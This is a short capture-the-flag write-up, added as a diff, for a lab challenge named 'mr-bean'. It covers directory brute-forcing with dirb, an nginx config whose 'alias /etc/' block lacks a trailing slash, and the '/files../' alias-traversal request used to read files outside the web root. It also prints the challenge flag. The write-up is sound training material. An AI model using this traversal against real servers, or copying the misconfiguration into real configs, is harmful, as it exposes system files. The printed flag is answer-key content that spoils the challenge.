@@ -1,0 +1,61 @@
+  
+                        ddirectory-traversal-----> mr-bean  
+
+    *  First, We need to start with directory brute-force using --> dirb 
+          =======> dirp http://wlemyw93xjyc7zr8r4gvmkxal3dmndvjyxmlfevy-web.cybertalentslabs.com
+
+    * Then we can see the directory http://wlemyw93xjyc7zr8r4gvmkxal3dmndvjyxmlfevy-web.cybertalentslabs.com/files 
+
+    * Then we got all files in this directory. Let’s try to go back to previous directory by using Path Traversal attack, aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)  
+
+    * we can see we got =======> (404 Not Found) 
+
+    * But we can see that the  web server is nginx 
+
+    * so get back to files direc , lets choose nginx/ directory then choose        
+              default.conf as you see ||
+                                      ||
+                                      ||
+                                      VV
+                               server {
+             listen 80;
+ 
+               root /usr/share/nginx/html;
+
+              index index.html;
+
+                   server_name _;
+
+                autoindex on;
+
+                location /files {
+                 alias /etc/;
+                 }
+                          } 
+
+
+     * We have  =====>  [nginx alias_traversal] -----> here more explain ----> https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md 
+
+     * so let's write at the end of the url /files../  
+        [ http://wlemyw93xjyc7zr8r4gvmkxal3dmndvjyxmlfevy-web.cybertalentslabs.com/files../  ]
+
+ 
+    *  We have here many directories , but we can see in the description of the challenge 
+                     Come back home Mr. Bean.
+
+    * So let's choose home/ directory  
+            ======> then choose directory flag.txt 
+
+            here is the flag -----> FLAG{Nginx_nOt_aLWays_sEcUre_bY_The_waY}
+      
+
+
+
+
+
+
+
+
+
+
+                                     
